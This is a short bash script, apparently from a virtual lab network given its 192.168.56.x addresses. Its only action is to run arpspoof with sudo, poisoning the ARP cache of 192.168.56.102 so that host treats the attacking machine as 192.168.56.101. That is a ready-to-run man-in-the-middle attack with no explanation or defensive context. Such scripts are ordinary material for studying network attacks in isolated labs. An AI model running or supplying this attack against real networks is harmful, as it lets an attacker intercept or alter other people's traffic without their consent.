#!/bin/bash

set -e

sudo arpspoof -i enp0s8 -t 192.168.56.102 192.168.56.101